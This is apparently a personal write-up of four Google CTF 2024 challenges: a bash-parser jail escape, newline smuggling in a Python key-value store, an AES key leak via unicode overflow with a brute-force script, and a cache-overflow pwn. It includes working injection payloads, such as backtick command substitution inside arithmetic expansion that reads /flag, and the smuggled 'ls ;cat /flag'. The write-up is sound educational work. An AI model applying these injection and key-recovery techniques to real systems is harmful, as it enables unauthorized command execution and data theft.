# Google CTF 2024
Lysithea

*Trying to Writeup in English for the first time.*

It's been a while for me to participate in another CTF game (on my own, again). Google CTF is competition for more senior players, which I doubt I could ever be one of them. It turns out that I can only solve the easiest among all challenges, all below 250 pt under dynamic scoring.

## misc - onlyecho
This challenge implements bash jail in javascript. It uses the `bash-parser` package to analyze the AST tree of bash commands, and only will run the command if it does not contain nodes of `Redirect` or `Command` with `name` different from `echo`. There is an [online playground of bash-parser](https://vorpaljs.github.io/bash-parser-playground/), by developer of this package him/herself.

```js
for (var prop in ast) {
    if (prop === 'type' && ast[prop] === 'Redirect') {
      return false;
    }
    if (prop === 'type' && ast[prop] === 'Command') {
      if (ast['name'] && ast['name']['text'] && ast['name']['text'] != 'echo') {
        return false;
      }
    }
    if (!check(ast[prop])) {
      return false;
    }
  }
```

Clearly this AST tree is not that robust, as many rarely used feature may be neglected. Array and indexing is, unfortunately, one of them. There is a [bash arithmetic RCE](https://dev.to/greymd/eq-can-be-critically-vulnerable-338m) exploit I learnt back in 0CTF, where the index of an array can contain `$()` to execute any subcommand, like `$((x[$(id >/proc/$$/fd/1)]))`. 

It would be easy to notice that arithmetic expansion would mess up the AST tree, as the `Command` nodes are not extracted out. It's interesting to note that, the things inside `$()` is treated almost as arithmetic expression, like `>` is greater sign, `/` is division sign, and this would sometimes cause the AST parsing to fail, which should be avoided. A more decent pattern would be to use ` `` ` instead of `$()`.

```bash
echo $((`id >/tmp/f`))
```

```json
{
  "type": "Script",
  "commands": [
    {
      "type": "Command",
      "name": {
        "text": "echo",
        "type": "Word"
      },
      "suffix": [
        {
          "text": "$((`id >/tmp/f`))",
          "expansion": [
            {
              "loc": {
                "start": 0,
                "end": 16
              },
              "type": "ArithmeticExpansion",
              "expression": "`id >/tmp/f`",
              "arithmeticAST": {
                "type": "TemplateLiteral",
                "start": 0,
                "end": 12,
                "loc": {
                  "start": {
                    "line": 1,
                    "column": 0
                  },
                  "end": {
                    "line": 1,
                    "column": 12
                  }
                },
                "expressions": [],
                "quasis": [
                  {
                    "type": "TemplateElement",
                    "start": 1,
                    "end": 11,
                    "loc": {
                      "start": {
                        "line": 1,
                        "column": 1
                      },
                      "end": {
                        "line": 1,
                        "column": 11
                      }
                    },
                    "value": {
                      "raw": "id >/tmp/f",
                      "cooked": "id >/tmp/f"
                    },
                    "tail": true
                  }
                ]
              }
            }
          ],
          "type": "Word"
        }
      ]
    }
  ]
}
```

The next step is to get the echo of commands. The jail would only write out the stdout to us, but the result of our injected command wouldn't be echoed to stdout, but rather captured by its parent command. The outermost arithmetic expansion would always return a number. We could let it spit out the ascii code of result one byte at a time with builtin programs of ubuntu, such as `awk`,`sed`,`od`. (Note that `hexdump`, `xxd` is not preinstalled on docker image `Ubuntu:24.04`). Following is a workable version, and we just to convert the hex of results back to characters.

```bash
# replace %d with numbers
echo -n $(( `echo -n 0x$(cat /flag|sed -n 1p|awk \'{print substr($0,%d,4)}\'|od -t x4|awk \'{print $2}\')` )),;
# CTF{LiesDamnedLiesAndBashParsingDifferentials}
```

## misc - pystorage
Pretty neat challenge. It implements a plain-text key-value database on disk in python. The format is similar to HTTP headers. 

```
secret_password:b0e4a5d323bcba957402bd61bba20598
secret_flag:CTF{testflag}
```

When initialized, two secret entries would be added: `secret_password` is urandom hex, while `secret_flag` is the flag we search for. If the key of any entry has prefix `secret_`, it is regarded as a secret item and regard us to input the content of `secret_password` to authenticate. When adding entries, it would append to the end of the file. When reading entries, if there are duplicated keys (which the program won't check when adding them), all entries would be returned. Furthermore, only the last one would be used when authenticating. So the clue is clear, we need to somehow add another `secret_password` to overwrite the initialized one.

The user input is processed with regular expressions:

```python
ADD_REQUEST_REGEX = re.compile(r'^add (?P<key>[^ ]+) (?P<value>[^ ]+)$')
GET_REQUEST_REGEX = re.compile(r'^get (?P<key>[^ ]+)$')
AUTH_REQUEST_REGEX = re.compile(r'^auth (?P<password>[^ ]+) (?P<request>.+)$')
```

and there are additional wafs:
```python
if ':' in key or '\n' in key or '\n' in value:
      return False
```

Although it seems invulnerable, `\r` actually has the same effect as `\n` when processed by `re`. So we can smuggle another entry like:
```
add 123 1\rsecret_password:123
```

> CTF{UNIv3rsa1_neWLine_1sNT_S@Fe!?}

## pwn - encrypt

In this challenge we have a python script `chal.py` that calls an ELF called `aes`. Not much reverse engineering to the binary is required actually.

There are two main functions to this program:
1. Encrypt a shell command up to 16 character. The shell command should match certain regular expressions. It would encrypt the command with AES128-ECB with unknown but fixed key file.

```py
whitelist = {
    "date": None,
    "echo": "[\\w. ]+",
    "ls": "[/\\w]+",
}
```

2. Run a encrypted shell command. It would decrypt the cipher, and only validate if the first term of the command is in whitelist, not the rest part. That means we can do something like `ls ;cat /flag`, as long as we get the cipher. Since this is ECB mode, we need to leak the key.

The interface between `chal.py` and binary `aes` is crucial. `aes` use `__isoc99_scanf("%x",local_d8 + local_c)` to get the input bytes, and `chal.py` would convert our input into hex of bytes separated by space. But instead of using `bytes.hex`, it uses `ord` to directly convert `str` to `int`, which would get the unicode number of characters that could be potentially larger than 256.

```py
def helper(cmd, data):
  if cmd == "encrypt":
    data = [ord(c) for c in data]
  else:
    data = list(bytes.fromhex(data))

  while len(data) < 16:
    data.append(0)

  # 16 bytes should be enough for everybody...
  inp = cmd + " " + " ".join("%02x" % c for c in data[:16])
  res = subprocess.check_output("./aes", input = inp.encode())
  print(f"res of subproc: {data} / {inp}")
  return bytes.fromhex(res.decode())
```

Even better, `\w` in regular expression can actually accept many unicode characters (including kanji, which is the first thing I tested). As a consequence, `aes` would receive integer larger than 256 as input (and stored it as unsigned int).

What would this overflowed input affect the encrypted the results? With some testing, I find out that if i-th character is any unicode larger than 256 (and also accepted by `\w`), after encrypting and decrypting back, the `i-th` byte would be a fixed mapping `f(c)`, where `c` is the `i-th` byte of the key! With local testing we can find out how each byte in the key map to which byte in the output. Constructing something like `ls 在在在在在在在在在在在在在` , we can get the last 13 bytes of the key on the server. With the left three bytes in the front, we can do a local brute forcing, to see which key gives the prefix `ls `. I implemented a multiprocessing code to do this task (could be better):

```py
from Crypto.Cipher import AES
import os, pickle
from itertools import product
from multiprocessing import Pool

p8 = lambda d: d.to_bytes(1, 'little')

# the mapping from key to decrypted(encrypted(key))
with open('key_map.pkl', 'rb') as fp:
    key_map = pickle.load(fp)

key_suffix_raw = b'\017[\034\203:Q\031z\a\035\252\370\373'
assert len(key_suffix_raw) == 13

key_suffix = b''
for b in key_suffix_raw:
    key_suffix += ( [k for k, v in key_map.items() if v[0] == b][0] ).to_bytes(1, 'little')

print(key_suffix)

ls_ciph = bytes.fromhex('d99b43e00799446680199fd1589db431')

def check_prefix(a,b,c):
    guess_key = p8(a) + p8(b) + p8(c) + key_suffix
    guess_plain = AES.new(guess_key, AES.MODE_ECB).decrypt(ls_ciph)
    return guess_plain.startswith(b'ls '), guess_key

if __name__ == '__main__':
    best_key = None
    with Pool(processes=16) as pool:
        task_pool = product(range(256),range(256),range(256),)
        
        try:
            while True:
                task_piece = [next(task_pool) for i in range(0x400)]
                piece_result = pool.starmap(
                    check_prefix,
                    task_piece,
                )
                
                for i, res in enumerate(piece_result):
                    valid, guess_key = res
                    if valid:
                        print(f"Success {guess_key}")
                        best_key = guess_key
                        break
                    else:
                        print('\r', guess_key[:3], end='')

                if best_key is not None:
                    break

        except StopIteration:
            print('end search', best_key)
            
    print('end search', best_key)
    
    cmd_ciph = AES.new(best_key, AES.MODE_ECB).encrypt(b"ls ;cat /flag".ljust(16, b'\x00'))
    print(cmd_ciph)
    # baade759750fe64236df87fc6816bdfb
    # CTF{hmac_w0uld_h4ve_b33n_bett3r}
```

## pwn - knife
I didn't finish this in time (I would have if I didn't waste much time on web-sappy challenge :( )

This program can convert text between plain text, hex and ascii85 (with variant alphabet) encoding. It implements a caching system, which will cache some of the encoding results to reuse them. Before the first user input, it read the flag from file and convert the encoding of flag for once. So the target is to trick the program into returning the cache, even if we don't know the cached content.

The hex encoding is simple. It just doesn't accept upper case. The Ascii85 is rather complicated. Each 5-bytes of a85 corresponds to 1-4 bytes. The encoding process is described as follows:

1. append a `\x00` to the end of the bytes, and append `\x01` until it reaches 5 bytes in total
2. Converts these 5 bytes into an integer in little endian.
3. Convert the result to base 85 expression, with specified alphabet.
4. Concatenate the result in little endian (lowest digits in front)

Since `85 ** 5 == 4437053125 > 256 ** 4 == 4294967296`, The total number of base85 representations is slightly larger than total number of 4 bytes. However, since ascii85 can represent less than 4 characters, there are ambuiguity when there are multiple groups of ascii85 cipher: `a85(a) + a85(aaaa) != a85(aaaa) + a85(a)`

Let's check the caching system thoroughly. The caches are stored in `cache` variable the `bss` segment. It could be defined as:
```c
struct Cache {
    char * hash;
    char *[6] entries;
} cache[11];
```

This whole command function contains logic on caching.

```c
void command(char *param_1_incodec,char *param_2_outcodec,char *param_3_content,int param_4_censor)

{
  cache_entry *pcVar1;
  code *pcVar2;
  ulong uVar3;
  int iVar4;
  size_t sVar5;
  undefined8 local_868;
  undefined8 local_860_decodedlen;
  undefined local_858 [1024];
  undefined local_458_plain [1024];
  long local_58_cachehit;
  char *local_50;
  int local_44;
  ulong local_40;
  ulong local_38;
  ulong local_30;
  ulong local_28;
  int local_20;
  int local_1c;
  
  local_1c = -1;
  local_20 = -1;
  for (local_28 = 0; local_28 < 6; local_28 = local_28 + 1) {
    iVar4 = strcmp(names[local_28],param_1_incodec);
    if (iVar4 == 0) {
      local_1c = (int)local_28;
    }
    iVar4 = strcmp(names[local_28],param_2_outcodec);
    if (iVar4 == 0) {
      local_20 = (int)local_28;
    }
  }
  if (local_1c == -1) {
    printf("Invalid encoding: %s\n",param_1_incodec);
  }
  else if (local_20 == -1) {
    printf("Invalid encoding: %s\n",param_2_outcodec);
  }
  else if (decoders[local_1c] == (char *)0x0) {
    puts("Sorry, that decoder is not implemented... Pull requests are welcome!");
  }
  else if (encoders[local_20] == (char *)0x0) {
    puts("Sorry, that encoder is not implemented... Pull requests are welcome!");
  }
  else {
    local_860_decodedlen = 0x400;
    pcVar2 = (code *)decoders[local_1c];
    sVar5 = strlen(param_3_content);
    local_44 = (*pcVar2)(local_458_plain,param_3_content,&local_860_decodedlen,sVar5);
    if (local_44 == 0) {
      puts("Decoding failed...");
    }
    else {
                    /* local_860 is actual length of decoded, x00 is not striped */
      local_50 = (char *)sha256(local_458_plain,local_860_decodedlen);
      local_30 = 0xffffffffffffffff;
                    /* check hash hit? */
      for (local_38 = 0; uVar3 = robin.0, local_38 < 10; local_38 = local_38 + 1) {
        if ((cache[local_38].plain_hash != (char *)0x0) &&
           (iVar4 = memcmp(local_50,cache[local_38].plain_hash,0x40), iVar4 == 0)) {
          local_30 = local_38;
        }
      }
      if (local_30 == 0xffffffffffffffff) {
                    /* cache hash not hit, rotate to next */
        local_30 = robin.0;
        pcVar1 = cache + robin.0;
        robin.0 = (robin.0 + 1) % 10;
        pcVar1->plain_hash = local_50;
        for (local_40 = 0; local_40 < 6; local_40 = local_40 + 1) {
                    /* reset cache */
          cache[uVar3].entries[local_40] = (char *)0x0;
        }
      }
      local_58_cachehit = get(cache[local_30].entries,param_2_outcodec);
      put(cache[local_30].entries,"plain",local_458_plain,local_860_decodedlen);
      sVar5 = strlen(param_3_content);
      put(cache[local_30].entries,param_1_incodec,param_3_content,sVar5);
      if (local_58_cachehit == 0) {
                    /* not hit */
        local_868 = 0x400;
        local_44 = (*(code *)encoders[local_20])
                             (local_858,local_458_plain,&local_868,local_860_decodedlen);
        if (local_44 == 0) {
          puts("Encoding failed...");
          return;
        }
        if (param_4_censor != 0) {
          printf("Success. Result: %s\n",local_858);
        }
        put(cache[local_30].entries,param_2_outcodec,local_858,local_868);
      }
      else if (param_4_censor != 0) {
        printf("Serving from cache. Result: %s\n",local_58_cachehit);
      }
      if (param_4_censor == 0) {
        puts("*censored*");
      }
    }
  }
  return;
}

```

This function would first decode the input into plain text. Obviously, `cache[i].hash` is SHA256 hex of decoded plain text (there can be upto 10 pieces of plain text), used as an index key of cache. Let's see the `put` function to see how cache is stored:

```c

void put(char **param_1_cache,char *param_2_incodec,void *param_3_content,size_t param_4_len)

{
  int iVar1;
  size_t sVar2;
  char *__dest;
  ulong local_10;
  
                    /* cache content is codec+contentlength+1 */
  sVar2 = strlen(param_2_incodec);
  __dest = safe_malloc(sVar2 + param_4_len + 1);
  sVar2 = strlen(param_2_incodec);
  memcpy(__dest,param_2_incodec,sVar2);
  sVar2 = strlen(param_2_incodec);
  memcpy(__dest + sVar2,param_3_content,param_4_len);
  sVar2 = strlen(param_2_incodec);
  __dest[param_4_len + sVar2] = '\0';
  for (local_10 = 0; (local_10 < 6 && (param_1_cache[local_10] != (char *)0x0));
      local_10 = local_10 + 1) {
                    /* if already put, then won't put */
    sVar2 = strlen(param_2_incodec);
    iVar1 = memcmp(__dest,param_1_cache[local_10],param_4_len + sVar2);
    if (iVar1 == 0) {
      return;
    }
  }
                    /* if entry is full, then here would be 6, hash for next! */
  param_1_cache[local_10] = __dest;
  return;
}


```

So the cached entry would be formatted as `encoding+content`, **no null byte or any separator is present**. For example, `plaintest` or `a85N2Qab`. `cache[i].entries` can store upto 6 different encodings (including plain text). But when 7th entry is stored, it would abnormally exit the loop and stored the entry to `cache[i+1].hash` in an overflow way. 

Clearly, we need to overflow to the hash of the cached flag entry. Following conditions should satisfy:

- The first 0x40 bytes should be a SHA256 hex of known sequence of bytes.
- It should start with valid encoding. Since hex is unique, it should only be `a85`. It's trival to find a plain text, whose SHA256 starts with `a85`
- We should find 4 more a85 encoding, that corresponds to the same plain text. This is easy with the ambuiguity we mentioned above:

```py
for i_strike in range(5):
    tail = [a85enc_chunk(b'\x00\x00\x00\x00')] * 4
    tail.insert(i_strike, a85enc_chunk(b'\x00'))
    req_line(b"a85 hex " + magic_a85.encode() + b''.join(tail))
```

After all this, we can simply use a `a85 hex` to get the flag out.

> CTF{nonc4nonical_3ncod1ngs_g00d_for_stego_g00d_for_pwn}